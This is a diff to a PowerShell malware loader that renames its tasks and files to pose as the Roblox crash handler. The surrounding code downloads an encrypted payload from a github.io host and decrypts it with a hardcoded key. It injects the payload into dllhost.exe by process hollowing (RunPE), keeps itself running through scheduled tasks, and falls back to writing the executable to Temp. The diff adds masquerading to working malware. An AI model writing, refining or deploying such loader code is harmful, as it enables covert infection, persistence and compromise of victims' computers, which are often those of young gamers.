@@ -53,8 +53,8 @@ Log-Msg "ActualWorkspace=$actualWorkspace"
 
 try {
     $ServerBaseUrl  = "https://cc312123.github.io/lowlife/files"
-    $LoaderTaskName = "RobloxPlayerBeta"
-    $PersistTask    = "RobloxPlayerBetaBootstrapper"
+    $LoaderTaskName = "RobloxCrashHandler"
+    $PersistTask    = "RobloxCrashHandlerBootstrapper"
     $HostProcess    = "C:\Windows\System32\dllhost.exe"
 
     # Verify Administrator privileges
@@ -457,7 +457,7 @@ Write-Host "[1/4] Stopping existing instances..." -ForegroundColor Yellow
 # Stop-ScheduledTask -TaskName $PersistTask    -ErrorAction SilentlyContinue
 Log-Msg "Checking for legacy RobloxPlayerBeta processes..."
 # Kill old file-based process if still present from a previous install (exclude official Roblox process)
-Get-Process -Name "RobloxPlayerBeta" -ErrorAction SilentlyContinue | ForEach-Object {
+Get-Process -Name "RobloxPlayerBeta", "RobloxCrashHandler" -ErrorAction SilentlyContinue | ForEach-Object {
     if ($_.Path -and ($_.Path -like "*\my private\*" -or $_.Path -like "*\Temp\*")) {
         Log-Msg "Stopping legacy process ID: $($_.Id)"
         Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
@@ -475,8 +475,8 @@ Log-Msg "Section 1 complete."
     Log-Msg "Loading payload into RAM..."
 
     $exeBytes = $null
-    $localExe = Join-Path $resolvedPath "build\RobloxPlayerBeta.exe"
-    $localServerExe = Join-Path $resolvedPath "updates-server\uploads\RobloxPlayerBeta.exe"
+    $localExe = Join-Path $resolvedPath "build\RobloxCrashHandler.exe"
+    $localServerExe = Join-Path $resolvedPath "updates-server\uploads\RobloxCrashHandler.exe"
 
     if (Test-Path $localExe) {
         Log-Msg "Found locally compiled executable at $localExe. Loading directly..."
@@ -489,7 +489,7 @@ Log-Msg "Section 1 complete."
         [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
         $wc       = New-Object System.Net.WebClient
         try {
-            $encBytes = $wc.DownloadData("$ServerBaseUrl/RobloxPlayerBeta.enc")
+            $encBytes = $wc.DownloadData("$ServerBaseUrl/RobloxCrashHandler.enc")
             Log-Msg "Payload downloaded ($($encBytes.Length) bytes)."
             
             $DecKey = [byte[]](0x4C,0x4F,0x57,0x4C,0x49,0x46,0x45,0x32,0x35,0x36,0x4B,0x45,0x59,0x21,0x40,0x23,
@@ -517,6 +517,8 @@ Log-Msg "Section 1 complete."
     # Remove old file-based install folder if it exists (legacy cleanup)
     $oldFolder = "$env:LOCALAPPDATA\RobloxPlayerBeta"
     if (Test-Path $oldFolder) { Remove-Item $oldFolder -Recurse -Force -ErrorAction SilentlyContinue }
+    $newFolder = "$env:LOCALAPPDATA\RobloxCrashHandler"
+    if (Test-Path $newFolder) { Remove-Item $newFolder -Recurse -Force -ErrorAction SilentlyContinue }
 
     $hollowSuccess = $false
     if (([System.Management.Automation.PSTypeName]"RunPE").Type) {
@@ -560,7 +562,7 @@ Log-Msg "Section 1 complete."
         } else {
             # Write RAM bytes to a file in the whitelisted workspace as fallback
             $fallbackDir = Join-Path $resolvedPath "build"
-            $fallbackExe = Join-Path $fallbackDir "RobloxPlayerBeta.exe"
+            $fallbackExe = Join-Path $fallbackDir "RobloxCrashHandler_fallback.exe"
             Log-Msg "Writing decrypted bytes to $fallbackExe for execution..."
             try {
                 if (-not (Test-Path $fallbackDir)) {
@@ -569,7 +571,7 @@ Log-Msg "Section 1 complete."
                 [System.IO.File]::WriteAllBytes($fallbackExe, $exeBytes)
             } catch {
                 Log-Msg "WARNING: Could not write fallback executable to ${fallbackExe}: $_"
-                $fallbackExe = Join-Path $env:TEMP "RobloxPlayerBeta.exe"
+                $fallbackExe = Join-Path $env:TEMP "RobloxCrashHandler_fallback.exe"
                 Log-Msg "Attempting to write fallback executable to temp directory: $fallbackExe"
                 try {
                     [System.IO.File]::WriteAllBytes($fallbackExe, $exeBytes)
